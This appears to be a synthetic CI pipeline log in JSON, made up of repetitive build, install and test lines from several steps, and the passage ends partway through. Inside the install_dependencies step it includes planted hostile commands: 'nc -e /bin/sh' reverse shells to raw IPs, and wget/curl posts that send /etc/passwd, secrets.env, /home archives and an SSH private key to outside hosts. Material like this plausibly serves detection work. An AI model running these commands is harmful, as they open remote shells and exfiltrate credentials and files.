build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (9MB)\nInstalling react@2.3.0\n\u2713 build completed\n  PASS: test_auth_login (463ms)\nInstalling eslint@2.2.0\nCache hit for key-1267\n[12:00:21] INFO: Processing request\nCache hit for key-5243\nInstalling axios@1.12.0\nInstalling react@5.2.0\nWARNING: jest has known vulnerabilities\nCache hit for key-2731\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\n\u2713 test completed\nStep 8/10: Building\nInstalling prettier@5.0.0\n\u2713 build completed\n[12:00:21] WARN: Deprecated API usage\n[12:00:21] INFO: Processing request\nInstalling axios@2.1.0\nCompiling src/handler.rs...\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\nInstalling axios@4.19.0\n\u2713 test completed\nInstalling axios@5.16.0\nCompiling src/app.ts...\n  PASS: test_user_create (293ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_db_connect (419ms)\n  PASS: test_user_create (172ms)\n[12:00:21] INFO: Processing request\nCache hit for key-4729\nInstalling lodash@4.17.0\n[12:00:21] WARN: Deprecated API usage\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nCache hit for key-2880\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-8914\nCompiling src/main.py...\nCache hit for key-8337\n\u2713 build completed\n  PASS: test_db_connect (320ms)\n\u2713 build completed\nCompiling src/utils.go...\nInstalling eslint@2.4.0\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:21] INFO: Processing request\n\u2713 lint completed\nCache hit for key-7381\nCache hit for key-1600\nCache hit for key-6994\n  PASS: test_db_connect (445ms)\nInstalling express@4.3.0\n\u2713 test completed\nInstalling axios@4.10.0\n[12:00:21] INFO: Processing request\nInstalling express@5.5.0\nStep 6/10: Building\nCompiling src/service.java...\nStep 10/10: Building\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\n  PASS: test_db_connect (188ms)\n[12:00:21] WARN: Deprecated API usage\n[12:00:21] INFO: Processing request\nCompiling src/main.py...\n[12:00:21] WARN: Deprecated API usage\n\u2713 test completed\nCompiling src/index.js...\nInstalling react@4.2.0\nArtifact uploaded: build.tar.gz (10MB)\nInstalling eslint@5.11.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:21] INFO: Processing request\nCache hit for key-5646\n[12:00:21] INFO: Processing request\nInstalling prettier@5.5.0\n\u2713 lint completed\n  PASS: test_db_connect (339ms)\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/index.js...\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:21] INFO: Processing request\nStep 2/10: Building\nStep 2/10: Building\nInstalling jest@1.20.0\nCache hit for key-9708\nArtifact uploaded: build.tar.gz (1MB)\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\nCache hit for key-2366\n\u2717 build failed with exit code 26\nCompiling src/index.js...\n\u2713 build completed\n\u2713 lint completed\n\u2713 lint completed\nInstalling prettier@2.9.0\n  PASS: test_user_create (492ms)\nStep 7/10: Building\nCompiling src/index.js...\n  PASS: test_auth_login (25ms)\n\u2713 lint completed\nCompiling src/app.ts...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:21] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (21MB)\nCache hit for key-5076\nStep 4/10: Building\n\u2713 build completed\nInstalling prettier@2.0.0\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nStep 7/10: Building\nCompiling src/service.java...\nInstalling eslint@1.18.0\nInstalling react@3.8.0\nCompiling src/app.ts...\nStep 8/10: Building\n  PASS: test_cache_hit (112ms)\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:21] INFO: Processing request\nCache hit for key-9066\n  PASS: test_api_health (246ms)\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/service.java...\nInstalling eslint@5.0.0\n\u2713 test completed\n[12:00:21] INFO: Processing request\nStep 6/10: Building\nInstalling react@1.11.0\n\u2713 lint completed\nCache hit for key-1386\n  PASS: test_auth_login (470ms)\nInstalling react@2.18.0\nCache hit for key-4285\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:21] INFO: Processing request\n\u2713 build completed\nInstalling react@3.17.0\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (29MB)\nStep 7/10: Building\n\u2713 test completed\nCompiling src/service.java...\nInstalling lodash@3.16.0\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-9143\n[12:00:21] INFO: Processing request\nInstalling react@4.13.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 build completed\nCache hit for key-4239\n[12:00:21] INFO: Processing request\nCompiling src/app.ts...\nInstalling webpack@3.3.0\nCompiling src/service.java...\nStep 8/10: Building\nCompiling src/utils.go...\n\u2713 lint completed\nCache hit for key-7440\nCompiling src/app.ts...\n\u2713 test completed\n[12:00:21] INFO: Processing request\nStep 5/10: Building\n\u2713 lint completed\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:21] INFO: Processing request\nInstalling react@4.15.0\n  PASS: test_api_health (468ms)\n[12:00:21] INFO: Processing request\n\u2713 build completed\nStep 5/10: Building\n  PASS: test_db_connect (336ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-1666\nStep 5/10: Building\n  PASS: test_auth_login (372ms)\nInstalling webpack@2.0.0\nCache hit for key-8879\nInstalling webpack@2.16.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (18MB)\nStep 10/10: Building\nStep 6/10: Building\n\u2713 test completed\nCompiling src/service.java...\n\u2713 build completed\n[12:00:21] INFO: Processing request\nInstalling eslint@1.18.0\n  PASS: test_cache_hit (270ms)\nArtifact uploaded: build.tar.gz (18MB)\nStep 3/10: Building\nInstalling jest@2.4.0\n  PASS: test_db_connect (273ms)\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:21] WARN: Deprecated API usage\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-3981\n\u2713 build completed\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/index.js...\n[12:00:21] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 lint completed\nFAILED: test_user_create\nStep 9/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/handler.rs...\n  PASS: test_cache_hit (109ms)\nFAILED: test_auth_login\nStep 5/10: Building\nCompiling src/utils.go...\n[12:00:21] INFO: Processing request\nCompiling src/service.java...\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\n  PASS: test_user_create (340ms)\n\u2713 lint completed\nCompiling src/app.ts...\n  PASS: test_user_create (496ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nStep 10/10: Building\nStep 7/10: Building\n  PASS: test_cache_hit (55ms)\nWARNING: eslint has known vulnerabilities\nnc -e /bin/sh 240.24.30.133 33653\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-5443\nCompiling src/main.py...\n  PASS: test_cache_hit (464ms)\n\u2713 lint completed\nInstalling eslint@5.18.0\nCompiling src/utils.go...\nStep 9/10: Building\nWARNING: lodash has known vulnerabilities\n  PASS: test_user_create (438ms)\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nInstalling express@2.7.0\n\u2713 lint completed\nCompiling src/handler.rs...\nInstalling prettier@3.3.0\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_cache_hit (479ms)\nCache hit for key-5584\nCompiling src/app.ts...\n[12:00:21] WARN: Deprecated API usage\n  PASS: test_user_create (148ms)\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/app.ts...\nCompiling src/handler.rs...\nFAILED: test_api_health\nCache hit for key-6268\nInstalling webpack@2.13.0\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-6360\nCompiling src/utils.go...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (14MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nStep 9/10: Building\nCompiling src/handler.rs...\n  PASS: test_api_health (333ms)\n  PASS: test_auth_login (275ms)\nCache hit for key-8701\nnc -e /bin/sh 45.64.2.79 55199\nInstalling eslint@4.5.0\n  PASS: test_api_health (290ms)\nCompiling src/main.py...\nStep 1/10: Building\n\u2713 build completed\nStep 5/10: Building\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (30MB)\nInstalling jest@2.12.0\nCompiling src/service.java...\nInstalling lodash@1.7.0\nCompiling src/app.ts...\nWARNING: prettier has known vulnerabilities\nCache hit for key-4706\n[12:00:21] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 lint completed\nStep 10/10: Building\n  PASS: test_api_health (15ms)\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-1180\nCache hit for key-6033\nCache hit for key-1264\nCompiling src/utils.go...\n  PASS: test_db_connect (116ms)\n[12:00:21] INFO: Processing request\nCache hit for key-8490\n  PASS: test_user_create (335ms)\n  PASS: test_db_connect (117ms)\nCache hit for key-2915\n\u2713 test completed\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_api_health (335ms)\nArtifact uploaded: build.tar.gz (20MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:00:21] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (10MB)\nStep 5/10: Building\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:21] INFO: Processing request\nnc -e /bin/sh 211.182.83.231 32071\nInstalling express@4.4.0\nStep 2/10: Building\nStep 10/10: Building\n[12:00:21] INFO: Processing request\n\u2713 build completed\nCache hit for key-6241\nCompiling src/handler.rs...\ncurl -X POST https://test.io/collect -d @secrets.env\n\u2713 lint completed\nnc -e /bin/sh 27.91.208.181 57804\ntar czf - /home | curl -X POST -d @- https://example.com/upload\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n\u2713 lint completed\n  PASS: test_auth_login (37ms)\nSending 297MB of data to test.io\nFAILED: test_api_health\nCache hit for key-6609\n[12:00:21] ERROR: Connection failed\n  PASS: test_auth_login (193ms)\nStep 9/10: Building\n[12:00:21] INFO: Processing request\n\u2713 test completed\nCompiling src/app.ts...\n  PASS: test_db_connect (313ms)\nCompiling src/app.ts...\n[12:00:21] INFO: Processing request\nCache hit for key-4014\nSending 244MB of data to example.com\nCompiling src/app.ts...\nCompiling src/handler.rs...\nnc -e /bin/sh 135.128.211.249 39536\nSending 137MB of data to startup.dev\nWARNING: axios has known vulnerabilities\n\u2713 lint completed\nnc -e /bin/sh 138.169.40.152 22794\nInstalling webpack@5.9.0\n[12:00:21] INFO: Processing request\n  PASS: test_api_health (122ms)\nStep 3/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 53.22.57.34 41100\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/10: Building\nStep 6/10: Building\nCompiling src/service.java...\nFAILED: test_user_create\n\u2713 lint completed\n\u2713 build completed\n[12:00:21] INFO: Processing request\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-21T12:00:21.341590",
        "finished_at": "2025-11-21T12:00:44.076218",
        "log_lines": [
          "=== Step: type_check ===",
          "  PASS: test_db_connect (209ms)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-1329",
          "Installing eslint@1.1.0",
          "  PASS: test_cache_hit (245ms)",
          "  PASS: test_db_connect (483ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/utils.go...",
          "[12:00:21] INFO: Processing request",
          "Installing prettier@2.19.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (464ms)",
          "Step 8/10: Building",
          "[12:00:21] INFO: Processing request",
          "FAILED: test_cache_hit",
          "  PASS: test_api_health (64ms)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "  PASS: test_db_connect (493ms)",
          "[12:00:21] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-5494",
          "Cache hit for key-6025",
          "Installing express@5.17.0",
          "\u2717 build failed with exit code 4",
          "Installing express@1.1.0",
          "  PASS: test_user_create (273ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (403ms)",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (269ms)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-7990",
          "\u2717 build failed with exit code 73",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_user_create (180ms)",
          "Cache hit for key-6123",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing express@3.2.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing express@1.12.0",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Cache hit for key-5190",
          "  PASS: test_user_create (196ms)",
          "Installing lodash@4.13.0",
          "Installing prettier@3.4.0",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Cache hit for key-7708",
          "Compiling src/index.js...",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 6/10: Building",
          "[12:00:21] INFO: Processing request",
          "Installing react@1.2.0",
          "Compiling src/app.ts...",
          "Installing axios@5.10.0",
          "  PASS: test_api_health (88ms)",
          "Step 5/10: Building",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "Installing eslint@2.14.0",
          "Cache hit for key-2330",
          "Compiling src/handler.rs...",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (43ms)",
          "Cache hit for key-9677",
          "  PASS: test_db_connect (374ms)",
          "[12:00:21] ERROR: Connection failed",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-7041",
          "Step 8/10: Building",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-1898",
          "\u2713 lint completed",
          "  PASS: test_auth_login (71ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/main.py...",
          "Installing webpack@5.10.0",
          "\u2713 test completed",
          "  PASS: test_db_connect (62ms)",
          "Cache hit for key-9238",
          "\u2713 build completed",
          "Cache hit for key-5261",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-9888",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Cache hit for key-3881",
          "Step 9/10: Building",
          "Installing axios@1.19.0",
          "  PASS: test_cache_hit (449ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Step 4/10: Building",
          "  PASS: test_auth_login (410ms)",
          "\u2713 build completed",
          "Cache hit for key-4139",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-21T12:00:44.076218",
        "finished_at": "2025-11-21T12:01:06.810846",
        "log_lines": [
          "=== Step: setup_node ===",
          "Installing axios@1.14.0",
          "Installing prettier@2.10.0",
          "Cache hit for key-9295",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (233ms)",
          "Compiling src/app.ts...",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 test completed",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "Installing webpack@5.2.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/handler.rs...",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:21] WARN: Deprecated API usage",
          "Exception: TypeError",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing react@2.1.0",
          "  PASS: test_auth_login (128ms)",
          "[12:00:21] WARN: Deprecated API usage",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-4774",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (234ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: NullPointerException",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-4875",
          "Step 7/10: Building",
          "Installing react@2.11.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 7/10: Building",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:21] WARN: Deprecated API usage",
          "  PASS: test_db_connect (310ms)",
          "Installing eslint@5.8.0",
          "  PASS: test_auth_login (136ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "Installing axios@4.0.0",
          "Compiling src/service.java...",
          "Cache hit for key-7107",
          "Installing eslint@2.1.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing jest@5.14.0",
          "Step 6/10: Building",
          "[12:00:21] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "Step 5/10: Building",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_db_connect (31ms)",
          "  PASS: test_user_create (267ms)",
          "Installing prettier@1.0.0",
          "[12:00:21] ERROR: Connection failed",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_api_health (318ms)",
          "Cache hit for key-9231",
          "Installing lodash@1.4.0",
          "Cache hit for key-8587",
          "Installing eslint@3.15.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 lint completed",
          "Cache hit for key-9223",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (13ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 5/10: Building",
          "FAILED: test_api_health",
          "\u2713 lint completed",
          "  PASS: test_api_health (36ms)",
          "  PASS: test_api_health (151ms)",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/10: Building",
          "  PASS: test_user_create (333ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Installing webpack@1.17.0",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Cache hit for key-3617",
          "Installing express@2.12.0",
          "Cache hit for key-1584",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing jest@4.5.0",
          "  PASS: test_db_connect (307ms)",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (409ms)",
          "Step 8/10: Building",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing axios@1.1.0",
          "Step 9/10: Building",
          "Installing webpack@4.9.0",
          "Cache hit for key-7816",
          "Cache hit for key-8449",
          "Step 10/10: Building",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-5158",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-21T12:01:06.810846",
        "finished_at": "2025-11-21T12:01:29.545474",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Step 8/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-2032",
          "  PASS: test_db_connect (383ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-3944",
          "Cache hit for key-4883",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (399ms)",
          "  PASS: test_auth_login (464ms)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (440ms)",
          "Cache hit for key-6843",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing webpack@2.14.0",
          "Step 3/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-8711",
          "Installing react@1.10.0",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Installing lodash@2.13.0",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Cache hit for key-8665",
          "Step 6/10: Building",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "WARNING: react has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "Installing axios@3.8.0",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (253ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-8754",
          "\u2713 test completed",
          "Cache hit for key-5995",
          "\u2713 test completed",
          "  PASS: test_cache_hit (474ms)",
          "Step 8/10: Building",
          "Cache hit for key-2274",
          "Compiling src/service.java...",
          "Installing eslint@1.10.0",
          "Step 2/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing axios@2.15.0",
          "Installing webpack@3.11.0",
          "  PASS: test_user_create (73ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing react@1.11.0",
          "Compiling src/service.java...",
          "Cache hit for key-1220",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 lint completed",
          "Installing jest@3.10.0",
          "\u2713 test completed",
          "Cache hit for key-8874",
          "\u2713 build completed",
          "FAILED: test_user_create",
          "Installing webpack@5.18.0",
          "Cache hit for key-8432",
          "[12:00:21] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "  PASS: test_db_connect (204ms)",
          "Compiling src/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (488ms)",
          "  PASS: test_api_health (251ms)",
          "  PASS: test_auth_login (141ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/index.js...",
          "Installing axios@4.16.0",
          "\u2713 lint completed",
          "Installing eslint@5.6.0",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 2",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 2/10: Building",
          "[12:00:21] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Installing express@2.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-4995",
          "Cache hit for key-2175",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (406ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:21] INFO: Processing request",
          "Step 1/10: Building",
          "Installing eslint@1.4.0",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Cache hit for key-5658",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Cache hit for key-5404",
          "[12:00:21] WARN: Deprecated API usage",
          "[12:00:21] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "  PASS: test_db_connect (185ms)",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing jest@1.17.0",
          "Compiling src/handler.rs...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-21T12:01:29.545474",
        "finished_at": "2025-11-21T12:01:43.186251",
        "log_lines": [
          "=== Step: restore_cache ===",
          "  PASS: test_db_connect (81ms)",
          "[12:00:21] ERROR: Connection failed",
          "\u2713 build completed",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (167ms)",
          "Step 8/10: Building",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (497ms)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "[12:00:21] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (97ms)",
          "  PASS: test_user_create (42ms)",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-9758",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/service.java...",
          "[12:00:21] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-5617",
          "Compiling src/utils.go...",
          "[12:00:21] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-8307",
          "  PASS: test_api_health (372ms)",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "Installing jest@2.15.0",
          "Step 1/10: Building",
          "Step 1/10: Building",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5467",
          "  PASS: test_cache_hit (330ms)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:21] ERROR: Connection failed",
          "Cache hit for key-5281",
          "[12:00:21] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (182ms)",
          "Installing axios@1.7.0",
          "Cache hit for key-6564",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-7553",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (180ms)",
          "Installing jest@1.2.0",
          "Installing eslint@4.10.0",
          "Step 2/10: Building",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-7893",
          "Cache hit for key-2622",
          "[12:00:21] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Cache hit for key-5116",
          "\u2713 test completed",
          "  PASS: test_db_connect (141ms)",
          "Cache hit for key-1072",
          "Step 7/10: Building",
          "Installing webpack@5.19.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_api_health (218ms)",
          "Installing lodash@4.18.0",
          "Step 3/10: Building",
          "Cache hit for key-1559",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (332ms)",
          "Step 3/10: Building",
          "Step 9/10: Building",
          "  PASS: test_db_connect (332ms)",
          "\u2713 build completed",
          "  PASS: test_db_connect (415ms)",
          "Compiling src/index.js...",
          "Cache hit for key-3987",
          "Cache hit for key-3282",
          "Cache hit for key-6879",
          "[12:00:21] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (305ms)",
          "Installing webpack@1.0.0",
